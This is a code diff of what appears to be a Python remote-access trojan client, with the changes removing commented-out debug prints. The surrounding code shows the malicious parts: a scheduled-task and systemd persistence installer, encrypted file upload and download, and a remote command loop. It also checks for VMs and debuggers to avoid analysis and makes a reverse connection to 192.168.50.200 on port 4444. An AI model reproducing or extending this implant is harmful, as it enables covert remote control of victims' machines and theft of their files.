@@ -257,7 +257,6 @@ class TaskInstaller:
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
             return result.returncode == 0
         except Exception as e:
-            # print(f"Error installing Windows task: {e}")
             return False
 
     def uninstall_windows_task(self):
@@ -266,7 +265,6 @@ class TaskInstaller:
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
             return result.returncode == 0
         except Exception as e:
-            # print(f"Error uninstalling Windows task: {e}")
             return False
 
     def install_linux_service(self):
@@ -293,7 +291,6 @@ class TaskInstaller:
             subprocess.run(f"systemctl start {self.task_name}", shell=True)
             return True
         except Exception as e:
-            # print(f"Error installing Linux service: {e}")
             return False
 
     def uninstall_linux_service(self):
@@ -305,7 +302,6 @@ class TaskInstaller:
             subprocess.run("systemctl daemon-reload", shell=True)
             return True
         except Exception as e:
-            # print(f"Error uninstalling Linux service: {e}")
             return False
 
     def install_task(self):
@@ -335,7 +331,6 @@ class ClientHandler:
     
     def download(self,filename):
         file_size = int(decrypt(self.recv(1024)).decode())
-        # print(file_size)
         block_size = 1024
         num_blocks = file_size // block_size
         remaining_bytes = file_size % block_size
@@ -346,15 +341,12 @@ class ClientHandler:
                 data = self.connection.recv(1024)
                 # full_data += data
                 file.write(data)
-                # print(f"chunk {chunk_number} received.", end='\r',flush=True)
                 chunk_number += 1
             data = self.connection.recv(remaining_bytes)
             # full_data += data
-            # print("\nLast Chunk received")
             # file.write(full_data)
             file.write(data)
             file.close()
-            # print("\nFile received successfully.")
 
     def get_system_info(self):
         try:
@@ -396,7 +388,6 @@ class ClientHandler:
         file_path = os.path.join(current_path,filename)
         file_size_upload = str(os.path.getsize(file_path))
         self.send(encrypt(file_size_upload.encode()))
-        # print(file_size_upload)
         time.sleep(0.2)
         block_size = 1024
         num_blocks = int(file_size_upload) // block_size
@@ -406,14 +397,11 @@ class ClientHandler:
             for i in range(num_blocks):
                 data_chunk = file.read(1024)
                 self.send(data_chunk)
-                # print(f"Chunk {chunk_number} sent.", end='\r',flush=True)
                 chunk_number += 1
                 time.sleep(0.05)
             data_chunk = file.read(remaining_bytes)
             self.send(data_chunk)
-            # print("\nLast chunk sent")
             file.close()
-            # print("\nFile sent successfully.")
 
     def encrypt_file(self , filename):
         current_path =  os.path.abspath(os.getcwd())
@@ -482,7 +470,6 @@ class ClientHandler:
         while True:
             try:
                 cmd = decrypt(self.recv()).decode()
-                # print(f"[Received] {cmd}")
                 if cmd == "close":
                     self.connection.close()
                     sys.exit()
@@ -693,20 +680,17 @@ class ClientHandler:
                 self.send(b'1')
                 self.send(encrypt(f"Error: {e}".encode()))
                 self.recv()
-                print(f"[Error] {e}")
                 break
 
 # ------------------ Main Server ------------------
 
 def Connect_to_server():
     if not (check_vm() or check_debugger()):
-        # print(" No Debugger or VM detected.")
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
             operating_system = predict_operating_system()
             while 1:
                 try:
                     sock.connect(("192.168.50.200",4444))
-                    # print("[*] Connected to server ...    ")
                     time.sleep(1)
                     sock.sendall(key)  # Send 256-bit key
                     time.sleep(1)
@@ -717,17 +701,13 @@ def Connect_to_server():
                     if client.authenticate():
                         client.handle_commands(operating_system)
                     else:
-                        # print("Authentication Error")
                         client.connection.close()
                     return
                 except Exception:
                     timer = 20
-                    # print("Server is not up yet. Trying again in")
                     for i in range(timer,0,-1):
-                        # print(f"{i} seconds ", end="\r",flush=True)
                         time.sleep(1)
     else:
-        # print("Debugger or VM detected. Exiting...")
         sys.exit()
 
 if __name__ == "__main__":
